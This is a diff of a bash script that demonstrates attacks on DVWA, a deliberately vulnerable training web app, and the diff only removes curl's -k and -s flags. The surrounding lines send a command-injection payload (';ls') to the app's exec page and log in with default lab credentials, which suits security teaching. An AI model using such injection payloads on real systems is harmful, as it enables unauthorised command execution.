@@ -344,7 +344,7 @@ Command_Injection() {
     echo ""
     echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/login.php${RESTORE} username=${YELLOW_BOLD}pablo${RESTORE} password=${YELLOW_BOLD}letmein${RESTORE}"
     echo ""
-    curl -k "${DVWA_URL}/login.php" \
+    curl "${DVWA_URL}/login.php" \
         -H "authority: ${DVWA_URL}" \
         -H "cache-control: max-age=0" \
         -H "content-type: application/x-www-form-urlencoded" \
@@ -357,7 +357,7 @@ Command_Injection() {
 
     echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/vulnerabilities/exec/${RESTORE} submit=${RED_BOLD}\";ls\""
     echo ""
-    curl -k -s "${DVWA_URL}/vulnerabilities/exec/" \
+    curl -s "${DVWA_URL}/vulnerabilities/exec/" \
         -H "authority: ${DVWA_HOST}" \
         -H "cache-control: max-age=0" \
         -H "content-type: application/x-www-form-urlencoded" \
@@ -413,7 +413,7 @@ Cookie_Security() {
     echo ""
     echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/login.php${RESTORE} username=${CYAN_BOLD}smithy${RESTORE} password=${CYAN_BOLD}password${RESTORE}"
     echo ""
-    curl -k "${DVWA_URL}/login.php" \
+    curl "${DVWA_URL}/login.php" \
         -H "authority: ${DVWA_HOST}" \
         -H "cache-control: max-age=0" \
         -H "content-type: application/x-www-form-urlencoded" \
@@ -438,7 +438,7 @@ Cookie_Security() {
     read response
     echo ""
     echo -e "Connecting to ${CYAN_BOLD}${DVWA_URL}/security.php\n${RED}"
-    curl -k -s '${DVWA_URL}/security.php' \
+    curl '${DVWA_URL}/security.php' \
         -H 'authority: ${DVWA_HOST}' \
         -H 'cache-control: max-age=0' \
         -H 'content-type: application/x-www-form-urlencoded' \
